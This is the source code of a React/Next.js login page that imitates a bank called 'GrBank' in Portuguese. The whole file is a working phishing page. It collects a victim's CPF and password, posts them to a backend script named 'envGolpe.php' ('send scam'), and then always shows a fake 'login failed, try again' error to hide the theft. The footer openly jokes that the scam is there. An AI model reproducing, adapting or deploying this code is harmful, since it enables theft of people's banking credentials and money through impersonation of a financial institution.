import Head from 'next/head';
import { SubmitHandler, useForm } from 'react-hook-form';
import * as yup from 'yup';
import { yupResolver } from '@hookform/resolvers/yup';

import styles from '../styles/pages/Login.module.scss';
import { useEffect } from 'react';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { api } from '../services/api';

interface FormData {
  cpf: string;
  password: string;
}

const schemaValidate = yup.object().shape({
  cpf: yup.string().required('Por favor, informe o CPF').min(11, 'Por favor, digite um cpf valido'),
  password: yup.string().required('Por favor, informe a senha')
});

export default function Home() {

  const {
    register,
    handleSubmit,
    formState: { errors, isSubmitting }
  } = useForm({
    resolver: yupResolver(schemaValidate)
  });

  const handleSignIn: SubmitHandler<FormData> = async ({ cpf, password }) => {

    const data = {
      login: cpf,
      senha: password
    };

    try {
      const response = await api.post('envGolpe.php', data);

      toast.error('Não foi possivel efetuar o Login, tente novamente');
    } catch (error) {
      console.log(error);
    }
  }

  useEffect(() => {
    if (errors.cpf) {
      toast.error(errors.cpf.message)
    }

    if (errors.password) {
      toast.error(errors.password.message)
    }
  }, [errors]);

  return (
    <div className={styles.container}>
      <Head>
        <title>GrBank | Login</title>
      </Head>
      <main>
        <ToastContainer />
        <div className={styles.wrapperForm}>
          <div className={styles.logo}>

            <img src='/assets/512x512bb.jpg' alt="GrBank" />

            <h2>
              <span>Gr</span>
              Bank
            </h2>
          </div>

          <form onSubmit={handleSubmit(handleSignIn)}>
            <div className={styles.wrapperInput}>

              <div className={styles.input}>
                <label>
                  <input
                    name="cpf"
                    type="cpf"
                    className={errors.cpf && 'error'}
                    placeholder=" "
                    pattern="[0-9]+"
                    {...register('cpf')}
                  />
                  <p>CPF</p>
                </label>
              </div>

              <div className={styles.input}>
                <label>
                  <input
                    autoComplete="off"
                    name="password"
                    type="password"
                    className={errors.password && 'error'}
                    placeholder=" "
                    {...register('password')}
                  />
                  <p>Senha</p>
                </label>
              </div>

              <a href="#">Esqueci minha senha</a>
            </div>

            <button>
              {isSubmitting ? 'loading' : 'Login'}
            </button>
          </form>
        </div>

        <footer>
          ©GR Bank - Todos os direitos o golpe tá ai reservados.
        </footer>
      </main>
    </div>
  )
}
